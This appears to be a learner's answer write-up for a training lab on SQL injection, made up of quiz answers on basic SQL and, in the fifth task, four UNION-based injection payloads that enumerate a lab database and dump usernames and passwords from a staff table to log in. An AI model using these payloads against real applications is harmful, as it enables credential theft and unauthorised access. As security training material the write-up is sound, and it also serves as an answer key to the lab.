# SQL Injection

Learn how to detect and exploit SQL Injection vulnerabilities.

Nov 23, 2021

#### `Task 1: Brief`
##### - What does SQL stand for?
	- Structured Query Language
	
#### `Task 2: What is a Database?`
##### - What is the acronym for the software that controls a database?
	- DBMS
	
##### - What is the name of the grid-like structure which holds the data?
	- Table
	
#### `Task 3: What is SQL?`
##### - What SQL statement is used to retrieve data?
	- SELECT
	
##### - What SQL clause can be used to retrieve data from multiple tables?
	- UNION
	
#####- What SQL statement is used to add data?
	- INSERT

#### `Task 4: What is SQL Injection?`
##### - What character signifies the end of an SQL query?
	- ;

#### `Task 5: In-Band SQLi?`
Deploy the machine, then use the given commands by inserting it next to the last parameter.
- This will give you the database, then use the next one 
```
0 UNION SELECT 1,2,database()
```
- This will show the different table name in the sqli_one database
```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```
- This will show you the diffent column name in the table
```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```
- This will display the contents of that column
```
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
By doing the steps above you will find the username and password, then you can proceed inputting it in the login form.


